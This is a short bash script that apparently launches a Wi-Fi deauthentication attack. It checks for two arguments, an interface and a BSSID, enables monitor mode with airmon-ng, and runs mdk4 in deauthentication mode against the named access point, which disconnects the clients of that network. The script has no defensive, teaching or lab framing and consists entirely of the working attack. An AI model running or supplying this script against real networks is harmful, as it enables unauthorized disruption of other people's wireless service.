#!/bin/bash

if [[ -z $1 || -z $2 ]]; then
	echo "help : cmd <iface> <bssid>"
	exit 1
fi

airmon-ng start $1
mdk4 "$1mon" d -B $2
